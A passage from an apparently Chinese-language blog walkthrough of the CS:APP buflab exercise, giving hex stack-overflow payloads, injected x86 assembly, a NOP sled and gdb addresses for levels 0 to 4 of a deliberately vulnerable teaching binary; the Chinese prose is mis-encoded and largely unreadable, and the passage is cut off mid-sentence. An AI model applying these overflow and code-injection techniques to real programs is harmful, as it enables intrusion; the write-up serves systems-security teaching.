å››å­—èŠ‚çš„<code>00</code>ï¼Œå°±ä¼šæŠŠ<code>00 00 00 00</code>å¼¹ç»™<code>ebp</code>è€ŒæŠŠ<code>smoke()</code> å‡½æ•°çš„è¿”å›åœ°å€å¼¹ç»™<code>eip</code>äº†ã€‚æ‰€ä»¥æ­£ç¡®çš„<code>payload</code>åº”è¯¥æ˜¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">18 8c 04 08</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/26/tswP6XaDFAEB94S.png" alt="buflab_level0_3.png"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œè¿™å°±æ”»å‡»æˆåŠŸäº†ï¼Œæˆ‘æ˜¯æ²¡æƒ³åˆ°å•Šï¼Œæœ€ç®€å•çš„æ”»å‡»å°±è´¥ä¸‹é˜µæ¥ï¼Œä¸€æ¬¡å¤±è´¥ç„¶åæˆåŠŸå¾—åˆ°çš„ç»éªŒæ¯”å¤šæ¬¡æˆåŠŸå¾—åˆ°çš„ç»éªŒæ˜¯å¤šå¾ˆå¤šçš„ï¼Œæ‰€ä»¥å˜›ï¼Œè¿™æ³¢ä¸äºã€‚</p><h2 id="level1-Sparkler"><a href="#level1-Sparkler" class="headerlink" title="level1:Sparkler"></a>level1:Sparkler</h2><p>è¿™æ¬¡è¦æ±‚æˆ‘ä»¬æ‰§è¡Œçš„<code>shell</code>å‡½æ•°æ˜¯<code>fizz(int val)</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fizz</span><span class="params">(<span class="keyword">int</span> val)</span> </span>&#123; </span><br><span class="line">    <span class="keyword">if</span> (val == cookie) &#123; </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Fizz!: You called fizz(0x%x)\n&quot;</span>, val); </span><br><span class="line">        validate(<span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called fizz(0x%x)\n&quot;</span>, val);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œè¿™å›åŠ äº†ä¸ªå‚æ•°åˆ¤æ–­ï¼Œ32ä½çš„ç¨‹åºï¼Œç”šè‡³ä¸éœ€è¦ä»£ç æ³¨å…¥ï¼Œå‚æ•°ç›´æ¥å¾€è¿”å›åœ°å€åé¢å¡«å°±å¥½äº†ã€‚åœ°å€æ€ä¹ˆæ‰¾æˆ‘ä¹Ÿå°±ä¸èµ˜è¿°äº†ï¼ŒåŠ å‚æ•°çš„è¯ï¼Œå¦‚æœå¤šä½å‚æ•°è®°å¾—ä¸€å®šæ˜¯ä»å³å¾€å·¦å…¥æ ˆçš„ï¼Œå³ï¼šç¬¬ä¸€ä¸ªå‚æ•°åœ¨ç¦»æ ˆé¡¶æœ€è¿‘ï¼Œç¬¬äºŒä¸ªå°±æ˜¯ç½‘ç«™åº•èµ°å››ä¸ªå­—èŠ‚ï¼Œç¬¬ä¸‰ä¸ªâ€¦â€¦ä»¥æ­¤ç±»æ¨ã€‚ä½†æ˜¯ä¸€å®šæ³¨æ„æ ˆå¸§çš„æ„æˆï¼Œå®ƒåœ¨è°ƒç”¨å‡½æ•°çš„æ—¶å€™å‹å®Œå‚æ•°è¿˜è¦å‹<code>eip</code>ï¼Œè™½ç„¶æˆ‘ä»¬ä¸ä¸€å®šè¦å®ƒè¿”å›åˆ°ä»€ä¹ˆåœ°æ–¹ï¼Œä½†æ˜¯å®ƒæœ‰ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨åŸæ¥çš„åŸºç¡€ä¸Šå¡«å……å››ä¸ªå­—èŠ‚çš„å‡çš„è¿”å›åœ°å€å†æŠŠå‚æ•°åŠ è¿›å»</p><p>payloadå°±æ˜¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">42 8c 04 08//fizz address</span><br><span class="line">00 00 00 00//fake returning address</span><br><span class="line">8a 5f 63 5e//your cookie</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/28/kjfapgYERzZxwvG.png" alt="buflab_level1_1.png"></p><p>é‚£è¿™ä¸ª<code>level1</code>å°±ä¹Ÿè§£å†³äº†ï¼Œä¸ªäººè®¤ä¸ºè¿™ä¸ª<code>buflab</code>åº”è¯¥æ”¾åœ¨<code>attacklab</code>å‰é¢çš„ï¼Œ64ä½å‚æ•°ä¸å¥½ç›´æ¥ä¼ ï¼Œä½†æ˜¯32ä½å°±ç¡¬ä¼ ï¼Œä½†æ˜¯å®ƒè¿™ä¹ˆè®¾è®¡å¿…æœ‰ä»€ä¹ˆæˆ‘ç›®å‰ä¸çŸ¥é“çš„å·§å¦™ä¹‹å¤„ã€‚</p><h2 id="level2-Firecracker"><a href="#level2-Firecracker" class="headerlink" title="level2:Firecracker"></a>level2:Firecracker</h2><p>è¿™ä¸€æ¬¡è¦æ±‚æˆ‘ä»¬æ‰§è¡Œçš„<code>shell</code>å‡½æ•°æ˜¯<code>bang()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> global_value = <span class="number">0</span>; </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bang</span><span class="params">(<span class="keyword">int</span> val)</span> </span>&#123; </span><br><span class="line">    <span class="keyword">if</span> (global_value == cookie) &#123; </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Bang!: You set global_value to 0x%x\n&quot;</span>, global_value);     </span><br><span class="line">        validate(<span class="number">2</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;Misfire: global_value = 0x%x\n&quot;</span>, global_value);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥å¾ˆæ¸…æ¥šçš„çœ‹å‡ºæ¥ï¼Œç¨‹åºå®šä¹‰äº†ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œæ‰§è¡Œè¿™ä¸ªå‡½æ•°çš„æ—¶å€™è¦æ±‚è¿™ä¸ªå˜é‡==<code>your cookie</code>æˆ‘ä»¬éƒ½å¾ˆæ¸…æ¥šï¼Œå…¨å±€å˜é‡ä¸åŒäºå±€éƒ¨å˜é‡ï¼Œå±€éƒ¨å˜é‡æ˜¯å­˜åœ¨æ ˆä¸­çš„ï¼Œå…¨å±€å˜é‡å­˜åœ¨<code>.bss</code>æ®µæˆ–è€…æ˜¯<code>.data</code>æ®µçš„ï¼Œå› æ­¤æˆ‘ä»¬è¦ä¿®æ”¹ä¸å¯èƒ½åªæ˜¯ç®€å•çš„æ ˆæº¢å‡ºï¼Œæˆ‘ä»¬éœ€è¦æ³¨å…¥ä»£ç ã€‚åœ¨æ ˆä¸­æ³¨å…¥ä»£ç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movl value of cookie,address of global_value</span><br><span class="line">pushl (address of bang)</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>å› ä¸ºæ ˆå¯ä»¥æ‰§è¡Œä»£ç ï¼Œæ²¡å¿…è¦å»æœé›†<code>rop</code>ç¢ç‰‡ï¼Œç›´æ¥æ³¨å…¥è¿™ä¸€ä¸²ä»£ç å°±è¡Œäº†ã€‚<code>bang()</code>å‡½æ•°çš„åœ°å€å’Œ<code>cookie</code>æˆ‘ä»¬æ˜¯å¾ˆå®¹æ˜“è·å–çš„ï¼Œå”¯ä¸€å°±æ˜¯è¿™å…¨å±€å˜é‡çš„åœ°å€æˆ‘ä»¬æ²¡åŠæ³•ç›´æ¥è·å–ã€‚æˆ‘ä»¬å¯ä»¥é€‰æ‹©<code>disassemble bang</code>åæ±‡ç¼–è¿™ä¸ªå‡½æ•°çœ‹çœ‹å…·ä½“çš„ç»“æ„ã€‚</p><p><img src="https://i.loli.net/2021/04/29/vOFoK3wcjGVesHZ.png" alt="buflab_level2_1.png"></p><p>å¯ä»¥å‘ç°ä¸­é—´<code>cmp</code>æŒ‡ä»¤æ¯”è¾ƒä¸€å®šå°±æ˜¯é‚£ä¸ª<code>if</code>è¯­å¥çš„å®ç°ï¼Œæ¯”è¾ƒçš„ä¸œè¥¿è‚¯å®šä¹Ÿæ˜¯<code>cookie</code>å’Œé‚£ä¸ª<code>global_value</code>ï¼Œå¹¶ä¸”ä¹Ÿå¾ˆæ¸…æ¥šçš„å¯ä»¥çœ‹åˆ°ï¼Œå®ƒæ¯”è¾ƒçš„å†…å®¹éƒ½æ˜¯<code>ds</code>æ®µå¯„å­˜å™¨çš„ å†…å®¹ã€‚è‡³äºè¿™ä¸¤ä¸ªåœ°å€å“ªä¸€ä¸ªè¿˜éœ€è¦è¿›ä¸€æ­¥åˆ†æï¼Œå› ä¸ºæˆ‘ä»¬å¯ä»¥å¾ˆæ¸…æ¥šçš„çŸ¥é“ï¼Œåœ¨è¿è¡Œçš„æ—¶å€™æˆ‘ä»¬çš„<code>cookie</code>å°±æ˜¯å·²ç»ç¡®å®šçš„ï¼Œè€Œå¦ä¸€ä¸ªåˆ™åº”è¯¥ä¸€ç›´æ˜¯0ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å…ˆ<code>b getbuf</code>ç„¶å<code>r- u xiaoji233</code>ï¼Œè¿è¡Œåœ¨ä¸­é—´åœä½çš„æ—¶å€™<code>print *0x804d100</code>çœ‹çœ‹è¿™ä¸ªåœ°å€åˆ°åº•æ˜¯ä»€ä¹ˆã€‚</p><p><img src="https://i.loli.net/2021/04/29/ZFRstrT8QAubCkJ.png" alt="buflab_level2_2.png"></p><p>å…¶å®ç»“æœå°±å¾ˆæ˜æ˜¾äº†ï¼Œ<code>0x804d100</code>å°±æ˜¯å…¨å±€å˜é‡çš„åœ°å€ï¼Œå¦ä¸€ä¸ªä½ æŠŠå®ƒè½¬æ¢æˆåå…­è¿›åˆ¶å°±æ˜¯ä½ çš„<code>cookie</code>ï¼Œç¡®å®šå®Œè¿™ä¸‰ä¸ªå†…å®¹ä»¥åé‡å†™ä¸€ä¸‹æ±‡ç¼–ä»£ç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movl $0x5e635f8a,0x804d100//åœ¨AT&amp;Tæ±‡ç¼–ä¸­ï¼Œç«‹å³æ•°ä¸€å®šè¦åŠ $ï¼Œä¸åŠ ä»£è¡¨æ˜¯åœ°å€ã€‚</span><br><span class="line">push 0x8048c9d//æ­¤æ—¶ä¸ç”¨è€ƒè™‘ç«¯åº</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç•¥å¾®å†æä¸€ä¸‹æŸ¥çœ‹æ±‡ç¼–ä»£ç æœºå™¨ç çš„æ–¹æ³•ï¼Œå…·ä½“æ“ä½œå¯ä»¥çœ‹æˆ‘ä¸Šä¸€ç¯‡åšæ–‡ã€‚ã€‚</p><p><img src="https://i.loli.net/2021/04/29/ds1iuEKNWXGUJ3P.png" alt="buflab_level2_3.png"></p><p>è¿˜æœ‰ä¸€ç‚¹éœ€è¦ç¡®å®šçš„å°±æ˜¯ç¼“å†²åŒºå­—ç¬¦çš„é¦–åœ°å€äº†ï¼Œå› ä¸ºè¿”å›åœ°å€è¦å¡«è¿™ä¸ªæ‰èƒ½æŠŠ<code>eip</code>åŠ«æŒåˆ°æ ˆä¸Šæ‰§è¡Œ,é‚£ä¹ˆæˆ‘ç°åœ¨è·å–çš„åœ°å€æ˜¯<code>0x55683868</code>ï¼Œè¿™ä¸ªæ¯ä¸ªäººidä¸åŒè²Œä¼¼ä¼šæœ‰ä¸å¤ªä¸€æ ·çš„ã€‚é‚£ä¹ˆæ–¹æ³•å°±æ˜¯å…ˆç¡®å®šebpç„¶åçœ‹çœ‹å­—ç¬¦ä¸²å¼€å§‹çš„ä½ç½®ç›¸å¯¹äºebpçš„åç§»ï¼Œå°±èƒ½è½»æ¾ç®—å‡ºæ¥äº†ã€‚è¿˜æœ‰ä¸€ä¸ªæ¯”è¾ƒä¸€èˆ¬çš„æ–¹æ³•åº”è¯¥é€‚åˆå¤§éƒ¨åˆ†äººï¼Œå…ˆ<code>b getbuf</code>ç„¶åè¿è¡Œåˆ°getså‡½æ•°ä¹‹åè§‚çœ‹æ ˆçš„æƒ…å†µã€‚å¦‚ä¸‹å›¾ï¼š</p><p><img src="https://i.loli.net/2021/04/29/A8cIFe3BvY7PSyT.png" alt="buflab_level2_4.png"></p><p>å°±å¯ä»¥å¾ˆè½»æ¾åœ°ç¡®å®šäº†ï¼Œå½“ä½ ä¸ç¡®å®šè‡ªå·±å¡«çš„è¿”å›åœ°å€æ˜¯ä¸å¯¹çš„æƒ…å†µä¸‹ï¼Œè¿™ä¸ªæ–¹æ³•ç™¾åˆ†ç™¾æ²¡é”™ï¼Œé‚£ä¹ˆæˆ‘ä»¬çš„payloadå°±æ˜¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">c7 04 25 00 </span><br><span class="line">d1 04 08 8a </span><br><span class="line">5f 63 5e 68 </span><br><span class="line">9d 8c 04 08 </span><br><span class="line">c3 00 00 00 //inject code</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">68 38 68 55//address of String&#x27;s top</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/29/D8Gm2SjunFXxQtd.png" alt="buflab_level2_5.png"></p><h2 id="level3-Dynamite"><a href="#level3-Dynamite" class="headerlink" title="level3:Dynamite"></a>level3:Dynamite</h2><p>è¿™ä¸€å…³å’±ä»¬éœ€è¦å†ä¸ç ´ååŸæœ‰æ ˆå¸§çš„æƒ…å†µä¸‹å°†è¿”å›å€¼ä¿®æ”¹æˆæˆ‘ä»¬è‡ªå·±çš„<code>cookie</code>ï¼Œè¿™ååˆ†ç¬¦åˆä¸€ä¸ªé»‘å®¢çš„ä½œä¸ºï¼Œå’±ä»¬èº«ä¸ºé»‘å®¢å°±è¯¥ç¥ä¸çŸ¥é¬¼ä¸è§‰çš„å»æ‹¿åˆ°<code>shell</code>ï¼Œä¸ç„¶å®¹æ˜“è¢«æ‰“awaï¼Œæ‰“<code>ctf-pwn</code>é¢˜çš„æˆ‘ä»¬åŸºæœ¬éƒ½æ˜¯èƒ½è·å–<code>shell</code>ä»€ä¹ˆäº‹éƒ½å¹²å¾—å‡ºæ¥ã€‚ç ´åäº†åŸæœ¬ç»“æ„ï¼Ÿå…³æˆ‘å•¥äº‹ï¼Œæˆ‘æ‹¿åˆ°äº†<code>shell</code>å°±å¤Ÿäº†ã€‚</p><p>è¨€å½’æ­£ä¼ ï¼Œåœ¨è¿™é‡Œå…¶å®<code>gdb</code>å°±ç‰¹åˆ«å¥½ç”¨ï¼Œå› ä¸ºæˆ‘èƒ½çŸ¥é“å®ƒå‡½æ•°è¿”å›åœ°å€åœ¨å“ªï¼Œæˆ‘åªéœ€è¦æŸ¥ä¸€ä¸‹è°ƒç”¨è¿™ä¸ªå‡½æ•°çš„ä¸»å‡½æ•°ï¼Œçœ‹çœ‹è°ƒç”¨å‡½æ•°å‰å­˜äº†äº›ä»€ä¹ˆä¸œè¥¿è¿›å»å°±å¯ä»¥å¾ˆæ¸…æ¥šçš„çŸ¥é“äº†ã€‚ä½†æ˜¯å‘¢ï¼Œæˆ‘ä»¬ä¸€å®šè¿˜æ˜¯è¦å…ˆæº¢å‡ºï¼Œä¸ç„¶éƒ½æ²¡åŠæ³•åŠ«æŒ<code>eip</code>äº†ï¼Œè‡³äºç ´åçš„å†…å®¹å¯ä»¥åœ¨ä»£ç æ³¨å…¥é‡Œé¢å»ä¿®å¤ã€‚å°±å¯ä»¥å†™å‡ºæˆ‘ä»¬è¦æ³¨å…¥çš„ä»£ç å°±æ˜¯:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">movl your cookie,%eax</span><br><span class="line">movl original ebp address,%ebp</span><br><span class="line">push original eip</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦æ‰¾åˆ°åŸæ¥çš„<code>ebp</code>å’Œ<code>eip</code>å°±å¯ä»¥å®ç°æ”»å‡»äº†,é‚£æˆ‘ä»¬å°±å…ˆç»™<code>getbuf()</code>çš„ç¬¬ä¸€å¥ä¸‹ä¸ªæ–­ç‚¹çœ‹çœ‹æ­¤æ—¶<code>ebp</code>çš„å€¼ï¼Œ<code>getbuf</code>çš„åæ±‡ç¼–ç»“æœè§ä¸Šé¢çš„å›¾ã€‚<code>b *0x80491f4</code>æ–­ä½æŸ¥çœ‹ <code>esp</code>çš„å€¼ã€‚</p><p><img src="https://i.loli.net/2021/04/29/gx6R1cHPh3iQuMA.png" alt="buflab_level3_1.png"></p><p>å¯ä»¥å¾ˆæ¸…æ¥šåœ°çœ‹åˆ°esp</p><p>è‡³äº<code>epi</code>ï¼Œå¯ä»¥è¿”å›æ±‡ç¼–å®ƒçš„çˆ¶å‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ°<code>call</code>å®Œ<code>getbuf()</code>çš„ä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€ï¼Œè¿™ä¸ªåº”è¯¥å°±æ˜¯ä¹‹å‰ä¿å­˜çš„è¿”å›åœ°å€äº†ã€‚</p><p><img src="https://i.loli.net/2021/04/29/VWAo9rX3JPUuhqT.png" alt="buflab_level3_2.png"></p><p>è¿™é‡Œè®²ä¸€ä¸‹å‡½æ•°è°ƒç”¨çš„æœºåˆ¶ï¼Œå…ˆæ˜¯ä¼ å‚æ•°ï¼Œ32ä½çš„ç¨‹åºæ˜¯ä»å·¦åˆ°å³ä¾æ¬¡å…¥æ ˆï¼Œ64ä½çš„ç¨‹åºåˆ™æ˜¯å‰å…­ä¸ªå‚æ•°åˆ†åˆ«è¿›å…¥<code>rdi,rsi,rdx,rcx,r8,r9</code>å¯„å­˜å™¨ï¼Œå‚æ•°å¤šäºå…­ä¸ªå†ä»å³å¾€å·¦ä¾æ¬¡å…¥æ ˆã€‚æ¥ä¸‹æ¥ä¿å­˜è°ƒç”¨è¯¥å‡½æ•°è¯­å¥ä¸‹ä¸€å¥çš„æŒ‡ä»¤åœ°å€å­˜åœ¨æ ˆä¸Šï¼Œè¿™ä¸ªå°±æ˜¯æ‰€è°“çš„è¿”å›åœ°å€äº†ã€‚è‡³äºæ¥ä¸‹æ¥çš„äº‹ï¼Œé‚£å°±æ˜¯åœ¨å‡½æ•°é‡Œé¢äº†ï¼Œåˆ†åˆ«æœ‰ä¿å­˜çˆ¶å‡½æ•°çš„æ ˆå¸§æƒ…å†µï¼Œè®¡ç®—å®Œæˆåè¿”å›å€¼ä¿å­˜åœ¨<code>eax</code>å¯„å­˜å™¨ä¹‹åå…ˆæ¢å¤çˆ¶å‡½æ•°çš„æ ˆå¸§æƒ…å†µ(å¼¹å‡º<code>ebp</code>ï¼Œ<code>esp</code>+å¯¹åº”çš„å€¼)ï¼Œå¼¹å‡º<code>eip</code>ã€‚</p><p>é‚£ä¹ˆæ³¨å…¥çš„ä»£ç å°±å¾ˆæ¸…æ¥šäº†ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">movl $0x5e635f8a,%eax</span><br><span class="line">movl $0x556838c0,%ebp</span><br><span class="line">push $0x08048dbe</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>è¿è¡Œä¸€éçœ‹çœ‹ï¼Œå®Œç¾ï¼ï¼ï¼</p><p><img src="https://i.loli.net/2021/04/29/VH8wgMDON5KPln4.png" alt="buflab_level3_3.png"></p><h2 id="Level-4-Nitroglycerin"><a href="#Level-4-Nitroglycerin" class="headerlink" title="Level 4: Nitroglycerin"></a>Level 4: Nitroglycerin</h2><p>è¿™ä¸€å…³ï¼Œè¿™ä¸€å…³ä½ éœ€è¦ä½¿ç”¨<code>./bufbomb -n</code>å»æ‰§è¡Œï¼ŒåŠ äº†å‚æ•°ä¹‹åå°±ä¸ä¼šæ‰§è¡Œ<code>test()</code>å‡½æ•°äº†ï¼Œè€Œæ˜¯<code>testn()</code>å‡½æ•°ï¼Œè°ƒç”¨<code>getbufn()</code>å‡½æ•°å¹¶ä¸”ä½¿å®ƒè¿”å›ä½ çš„<code>cookie</code>ï¼Œä¹ä¸€å¬è·Ÿ<code>level3</code>å’‹ä¸€æ¨¡ä¸€æ ·ï¼Œä½†æ˜¯è‡ªå·±è°ƒè¯•ä¸€éå°±ä¼šå‘ç°å®ƒè¦æ±‚ä½ è¾“å…¥äº”æ¬¡ï¼Œå¹¶ä¸”æ¯æ¬¡çš„æ ˆå¸§éƒ½ä¸ä¸€æ ·ï¼Œæˆ‘æµ‹è¯•äº†ä¸€éï¼Œæ¯ä¸€æ¬¡çš„å­—ç¬¦ä¸²èµ·å§‹ä½ç½®å€¼æ˜¯åˆ†åˆ«æ˜¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x55683688</span><br><span class="line">0x55683658</span><br><span class="line">0x55683668</span><br><span class="line">0x55683628</span><br><span class="line">0x55683688</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæˆ‘ä»¬æ³¨å…¥çš„ä»£ç å°±ä¸èƒ½ç›´æ¥<code>mov $xxxx,%ebp</code>äº†ï¼Œå¾—é ç‚¹å…¶å®ƒä¸œè¥¿ï¼Œæƒ³æƒ³å‡½æ•°è°ƒç”¨çš„è¿‡ç¨‹ï¼Œæ˜¯æœ‰ä¸€ä¸ªè¿‡ç¨‹å«</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">push %ebp</span><br><span class="line">mov %esp,%ebp</span><br><span class="line">sub $xxx,%ebp</span><br><span class="line">//è°ƒç”¨è¿‡ç¨‹</span><br><span class="line">add $xxx,%ebp</span><br><span class="line">pop %ebp</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å‘ç°è°ƒç”¨çš„è¿‡ç¨‹ä¸­ï¼Œåªæœ‰æ ˆæ˜¯è¢«æˆ‘ä»¬ç ´åäº†ï¼Œå¯„å­˜å™¨æ˜¯å®Œå¥½æ— æŸçš„ï¼Œä½†æ˜¯<code>ebp</code>å¯„å­˜å™¨æœ‰ä¸€ä¸ªå–æ ˆä¸Šæ•°æ®çš„æ“ä½œï¼Œä½†æ˜¯<code>esp</code>å¯„å­˜å™¨è‡³å§‹è‡³ç»ˆæ˜¯å®Œå¥½çš„å‘€ã€‚å› æ­¤æˆ‘ä»¬åªè¦è®©<code>ebp</code>ä¸º<code>esp+0x28</code>(å› ä¸º<code>testn()</code>åœ¨è°ƒç”¨å‰ç”³è¯·äº†<code>0x24</code>çš„ç©ºé—´ï¼Œå†åŠ ä¸Šä¿å­˜çš„<code>ebp</code>å°±æ˜¯<code>0x28</code>)å°±è¡Œäº†ï¼Œä½†æ˜¯æ³¨æ„å–çš„æ˜¯åœ°å€ï¼Œç”¨<code>lea</code>æŒ‡ä»¤ï¼Œç„¶åå°±æ˜¯<code>eip</code>äº†ï¼Œè¿™æ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼Œçœ‹çœ‹è°ƒç”¨è¿™ä¸ªå‡½æ•°çš„ä¸‹ä¸€å¥æ˜¯ä»€ä¹ˆå°±è¡Œäº†ã€‚ä½†æ˜¯æ³¨æ„ï¼Œæˆ‘ä»¬è¿”å›çš„åœ°å€ä¹Ÿæ˜¯è¦æœ‰è®²ç©¶çš„ï¼Œå› ä¸ºæ¯ä¸€æ¬¡éƒ½ä¸ä¸€æ ·ï¼Œæˆ‘ä»¬å¾—é <code>nop</code>æŒ‡ä»¤ã€‚è®¡ç®—æœºæ‰§è¡Œ<code>nop</code>æŒ‡ä»¤é™¤äº†å†…éƒ¨ä¸€ä¸ªè®¡æ•°å™¨+1ä»¥å¤–ä¸ä¼šæœ‰ä»»ä½•æ“ä½œï¼Œå¹¶ä¸”åªå ç”¨ä¸€ä¸ªå­—èŠ‚<code>90</code>ï¼Œè€Œä¸”åˆšåˆšå¥½<code>getbuf()</code>å‡½æ•°å®ƒå¼€çš„å¾ˆå¤§ï¼Œç»™äº†æˆ‘ä»¬å……è¶³çš„æ»‘è¡Œè·ç¦»ã€‚æ³¨å…¥çš„ä»£ç æˆ‘ä»¬å°½é‡é è¿‘æ ˆåº•ï¼Œç„¶åè¿”å›çš„åœ°å€å°½é‡é€‰å–æœ€å°çš„(0x55683860)ï¼Œä»¥ä¾¿äºè¦†ç›–æ‰€æœ‰çš„æƒ…å†µã€‚é‚£æˆ‘ä»¬æ³¨å…¥çš„ä»£ç å°±æ˜¯:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov $0x5e635f8a,%eax</span><br><span class="line">lea 0x28(%esp),%ebp</span><br><span class="line">push $0x08048e3a</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>ç„¶åç¡®å®šä¸€ä¸‹å­—èŠ‚å¤§å°</p><p><img src="https://i.loli.net/2021/04/29/PGniK5S9eMjBR2U.png" alt="buflab_level4_1.png"></p><p>å­—ç¬¦æ˜¯ä»<code>0x208</code>çš„å†…å­˜å¼€å§‹çš„ï¼Œå†åŠ ä¸Š<code>ebp</code>é‚£å°±æ˜¯<code>0x20c</code>çš„å¤§å°äº†ï¼Œä¸åŒçš„æ˜¯ï¼šé‚£äº›æˆ‘ä»¬éƒ½å¡«å……<code>90</code>å°±è¡Œäº†ï¼Œ<code>payload</code>å°±æ˜¯</p><p><img src="https://i.loli.net/2021/04/29/dI7VyMspTgkN1Pa.png" alt="buflab_level4_2.png"></p><p>å¡«å……ä»£ç +ä»£ç é•¿åº¦ä¸º<code>0x20c</code>å°±å¥½äº†ã€‚</p><p>ç„¶åï¼Œæˆ‘å°±é»˜é»˜åœ°è°ƒäº†ä¸¤ä¸ªå°æ—¶çš„ä»£ç ï¼Œå»æŸ¥äº†<code>wp</code>æ‰å‘ç°ï¼Œ32ä½æ±‡ç¼–å’Œ64ä½æ±‡ç¼–çš„leaæŒ‡ä»¤æ˜¯ä¸ä¸€æ ·çš„ï¼ŒåŸæ¥æˆ‘å°±æ²¡æ³¨æ„è¿™ç‚¹<code>qwq</code>é»˜é»˜åœ°æ¯äº†ï¼ï¼</p><p><img src="https://i.loli.net/2021/04/29/auI7AecP4CnKrUv.png" alt="buflab_level4_3.png"></p><p>ç„¶åå°±åˆæ˜¯æ¼«é•¿çš„è°ƒè¯•è¿‡ç¨‹ï¼Œæˆ‘ä¸€ç›´ä»¥ä¸ºè¾“å…¥<code>r -u xiaoji233 -n 